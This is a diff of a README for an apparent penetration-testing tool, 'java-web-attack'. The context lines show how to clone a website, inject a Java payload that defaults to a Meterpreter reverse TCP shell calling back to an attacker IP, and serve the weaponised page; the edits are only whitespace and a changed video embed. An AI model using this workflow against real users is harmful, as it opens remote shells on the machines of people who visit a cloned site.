@@ -24,13 +24,13 @@ NOTE: You will want to run all of the commands in this tutorial as root.  To bec
 `~#` **`cd /opt/java-web-attack`**
 
 `/opt/java-web-attack#` **`./clone.sh <url to clone>`**
-  
+
 `/opt/java-web-attack#` **`./weaponize.py -h`**
 
         Usage:
           ./weaponize.py [-w <payload>] [-l <payload>] [-m <payload>] <html_file> <ip>
           ./weaponize.py -h
-        
+
         Options:
           -h            Shows this help message.
           -w            Specifies the Windows payload to use. [default: windows/meterpreter/reverse_tcp]
@@ -39,7 +39,7 @@ NOTE: You will want to run all of the commands in this tutorial as root.  To bec
           <payload>     The payload string as expected by msfvenom. Run `msfvenom -l payloads` to see all choices.
           <html_file>   The HTML file to insert the Java payload.
           <ip>          The IP address the payload should connect back to.
-        
+
         Note: The default ports used for the Windows, Linux, and Mac listeners are 3000, 3001, and 3002 respectively.
 
 `/opt/java-web-attack#` **`./serve.sh`**
@@ -47,11 +47,7 @@ NOTE: You will want to run all of the commands in this tutorial as root.  To bec
 Video Walkthrough
 -----------------
 
-<video controls>
-  <source src="Videos/1_550_Java_App_Evil.mp4">
-  <source src="https://onedrive.live.com/download.aspx?cid=8D6C4317A39E3D29&resid=8D6C4317A39E3D29%2155668&canary=">
- <p>Your browser does not support html5 video.</p>
-</video>
+<iframe src="https://onedrive.live.com/embed?cid=8D6C4317A39E3D29&resid=8D6C4317A39E3D29%2155668&authkey=AApvJtEtXsg4BMI" width="320" height="180" frameborder="0" scrolling="no" allowfullscreen></iframe>
 
 Example 1: Cloning a URL
 ------------------------
@@ -91,7 +87,7 @@ The basic usage of the `weaponize.py` script is to pass in the HTML file to modi
         Weaponizing html...
         Creating listener resource script...
         All output written to the "output" directory.
-        
+
         Run "serve.sh" to easily stand up a server.
 
 All files generated are saved in the **output** directory. The directory should now contain these files:
@@ -155,7 +151,7 @@ Note: If this does not work, rebooting your machine will.
 Example 5: Customizing the Payloads
 -----------------------------------
 
-There are a few ways to customize the payloads used by `weaponize.py`. 
+There are a few ways to customize the payloads used by `weaponize.py`.
 
 The first is through command line arguments to the script itself. For instance, to customize the Windows and Linux payloads (but leave the OSX payload as default) run:
 
